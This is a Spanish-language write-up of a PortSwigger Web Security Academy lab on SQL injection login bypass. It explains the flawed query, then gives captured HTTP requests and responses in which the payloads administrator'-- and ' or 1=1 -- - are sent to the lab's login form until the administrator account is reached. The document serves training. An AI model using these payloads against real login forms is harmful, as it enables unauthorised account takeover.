# 🩸 Laboratorio: Vulnerabilidad de inyección SQL que permite omitir el inicio de sesión

### Subvirtiendo la lógica de la aplicación

Imagine una aplicación que permita a los usuarios iniciar sesión con un nombre de usuario y contraseña. Si un usuario envía el nombre de usuario `wiener`y la contraseña `bluecheese`, la aplicación verifica las credenciales realizando la siguiente consulta SQL:

`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`

Si la consulta devuelve los detalles de un usuario, entonces el inicio de sesión se realizó correctamente. En caso contrario, se rechaza.

En este caso, un atacante puede iniciar sesión como cualquier usuario sin necesidad de contraseña. Pueden hacer esto usando la secuencia de comentarios SQL `--`para eliminar la verificación de contraseña de la `WHERE`cláusula de la consulta. Por ejemplo, enviar el nombre de usuario `administrator'--`y una contraseña en blanco da como resultado la siguiente consulta:

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

Esta consulta devuelve el usuario cuyo `username`nombre es `administrator`y registra exitosamente al atacante como ese usuario.

### Lab: SQL injection vulnerability allowing login bypass

APPRENTICE

LABNot solved

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

\


```python
// Some code

Laboratorio: Vulnerabilidad de inyección SQL que permite omitir el inicio de sesión








PROBAMOS UN INICIO DE SESION ERRONEO A PROPOSITO PARA VER LAS REQUEST Y RESPONSE :



REQUEST:



GET /generate_204 HTTP/1.1
Host: www.gstatic.com
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8
Connection: close









POST /login HTTP/2
Host: 0a5f006103a28feb84110074004600c1.web-security-academy.net
Cookie: session=O2g1wUoGCF0tHmeQiVPBp5HIMEZ1ZD5K
Content-Length: 68
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0a5f006103a28feb84110074004600c1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5f006103a28feb84110074004600c1.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8
Connection: close

csrf=Di8quIhnHOq14sqj8pmdLo1A1KRYkGAg&username=P4IM0N&password=12345








RESPONSE:






HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3227

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>SQL injection vulnerability allowing login bypass</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection vulnerability allowing login bypass</h2>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/lab-login-bypass'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <p class=is-warning>Invalid username or password.</p>
                        <form class=login-form method=POST action="/login">
                            <input required type="hidden" name="csrf" value="Di8quIhnHOq14sqj8pmdLo1A1KRYkGAg">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>










VAMOS A PROBAR INYECTONDO UN COMENTARIO DE INYECCION SQL PARA QUE NO VALIDE EL PASSWD Y VERIFICAREMOS SI TENEMOS SUERTE QUE TENGA EL SUUARIO ADMINISTRATOR Y VER SI SE TENZA LA COSA:






REQUEST:






POST /login HTTP/2
Host: 0a5f006103a28feb84110074004600c1.web-security-academy.net
Cookie: session=O2g1wUoGCF0tHmeQiVPBp5HIMEZ1ZD5K
Content-Length: 78
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0a5f006103a28feb84110074004600c1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5f006103a28feb84110074004600c1.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

csrf=Di8quIhnHOq14sqj8pmdLo1A1KRYkGAg&username=administrator'--&password=12345







RESPONSE REDIRECCION SE TENZO:



HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=JacNoGgMRWztJCUCy5k6j53ESRQiiMI1; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0







REQUEST AHORA SI SERIA LA SOLI DEL PANEL DE ADMINISTRATOR :D :



GET /my-account?id=administrator HTTP/2
Host: 0a5f006103a28feb84110074004600c1.web-security-academy.net
Cookie: session=O2g1wUoGCF0tHmeQiVPBp5HIMEZ1ZD5K
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0a5f006103a28feb84110074004600c1.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5f006103a28feb84110074004600c1.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8








RESPONSE:



HTTP/2 302 Found
Location: /login
Set-Cookie: session=6QHEVVmB3FMXWwNPx7cPQZLLZIUOHUpn; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0






REQUEST :





GET /login HTTP/2
Host: 0a5f006103a28feb84110074004600c1.web-security-academy.net
Cookie: session=O2g1wUoGCF0tHmeQiVPBp5HIMEZ1ZD5K
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0a5f006103a28feb84110074004600c1.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5f006103a28feb84110074004600c1.web-security-academy.net/my-account?id=administrator
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8








RESPONSE Y NO SE TENZO AL FINAL:





TTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=X9L28EnC376RMCtX9xXCbZyypRWR4ggF; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 3149

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>SQL injection vulnerability allowing login bypass</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection vulnerability allowing login bypass</h2>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/lab-login-bypass'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <form class=login-form method=POST action="/login">
                            <input required type="hidden" name="csrf" value="2SEG1IjdTkESK2w5ExiP5odLfAaP3h21">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>







VAMOS A PROBAR USANDO LA INYECCION CLASICA DE BOOLEANO COMPARACION ' or 1=1 -- - :





REQUEST:






POST /login HTTP/2
Host: 0a5f006103a28feb84110074004600c1.web-security-academy.net
Cookie: session=82EAIIJXhUN8Ut6ITxlBNznilKVfwF8g
Content-Length: 74
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a5f006103a28feb84110074004600c1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5f006103a28feb84110074004600c1.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

csrf=xdXwGEdOudTUlKHlX03yFOrehCNtLzks&username=administrator' or 1=1 -- -&password=1234






RESPONSE:

NO FUNCIONO; NO NOS TOMAMBA EL CSRF TOKEN.










PROBAREMOS AHORA DIRECTAMENTE MODIFICANDO LA REQUEST DESDE LA CAPTURA EN PROXY:





REQUEST:



POST /login HTTP/2
Host: 0a5f006103a28feb84110074004600c1.web-security-academy.net
Cookie: session=5KphrLcyddGDVyMs50159HmeA2iHWucM
Content-Length: 67
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a5f006103a28feb84110074004600c1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5f006103a28feb84110074004600c1.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8

csrf=J6iJn1pDErdVwSnlbmrRsHz2uYJXD23w&username=administrator'--&password=1234








GET /my-account?id=administrator HTTP/2
Host: 0a5f006103a28feb84110074004600c1.web-security-academy.net
Cookie: session=dCOWobHI7nB1OGjDQWYVZitppGN90jTC
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a5f006103a28feb84110074004600c1.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8





BINGO LOGRAMOPS ENTRAR AL PANEL DE ADMINISTRATOR





LO HICIMOS DE NUEVO CON REPITER Y BIENGO SE TENZO USANDO EL PRIMER TOKEN CSRF:





REQUEST:






GET /login HTTP/2
Host: 0a5f006103a28feb84110074004600c1.web-security-academy.net
Cookie: session=fwo9Kzf9OOjJVHTNEfTnMe81JBOvj2fE
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a5f006103a28feb84110074004600c1.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5f006103a28feb84110074004600c1.web-security-academy.net/my-account?id=administrator
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9,en;q=0.8






DOS REDIRECCIONE SEGUIMOS Y BINGO:









RESPONSE:

ESTAMOS COMO ADMINISTRATOR GRACIAS A LA INYECCION SQL DE COMENTARIO OBVIANDO LA CORROBORACION DEL PASSWORD:

 



HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=hMMTIoRfFO7YuIokoTlOTBxZRJcJGXSd; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 6135

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>SQL injection vulnerability allowing login bypass</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection vulnerability allowing login bypass</h2>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/lab-login-bypass'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aSQL+injection+vulnerability+allowing+login+bypass%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fsql-injection%2flab-login-bypass&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fsql-injection%2flab-login-bypass'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/sql-injection/lab-login-bypass'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <form class=login-form method=POST action="/login">
                            <input required type="hidden" name="csrf" value="6ZmgHl4aEV58z87jxWGNFCGT2Dj0SJDQ">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>





////// FIN DE NIVEL APRENDIZ  ///////////////
```
